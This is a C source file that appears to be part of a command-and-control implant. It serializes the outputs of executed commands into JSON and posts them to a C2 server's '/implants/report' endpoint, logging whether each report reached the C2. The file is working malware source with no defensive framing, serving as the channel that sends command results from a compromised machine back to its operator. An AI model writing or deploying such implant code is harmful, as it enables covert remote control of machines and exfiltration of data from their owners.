#include "report.h"
#include "cjson/cJSON.h"
#include "http-client.h"
#include "config.h"
#include <stdio.h>
#include <stdlib.h>

void send_report(ReportContext *ctx) {
    if(ctx->rq->len == 0) return;

    cJSON *results_array = cJSON_CreateArray();

    for(size_t i = 0; i < ctx->rq->len; i++) {
        Result r = ctx->rq->item[i];

        cJSON *result_obj = cJSON_CreateObject();
        cJSON_AddNumberToObject(result_obj, "cmd_id", r.cmd_id);
        cJSON_AddStringToObject(result_obj, "output", r.output);

        cJSON_AddItemToArray(results_array, result_obj);
    }

    cJSON *root = cJSON_CreateObject();
    cJSON_AddItemToObject(root, "results", results_array);

    char url[256];
    snprintf(url, sizeof url, "%s/implants/report", C2_URL);

    char *body = cJSON_PrintUnformatted(root);
    char *resp = NULL;
    int err = http_post(url, body, &resp);
    
    if(err != 0) {
        printf("⚠️ - FAILED TO SEND REPORT TO C2, LIBCURL ERR %d\n", err);
        cJSON_Delete(root);
        free(body);
        free(resp);
        return;
    }

    printf("📤 - REPORT SENT, %zu results sent\n", ctx->rq->len);
    cJSON_Delete(root);
    free(body);
    free(resp);
    return;
}


void reporting_job(void *c) {
    ReportContext *ctx = (ReportContext *)c;
    send_report(ctx);
}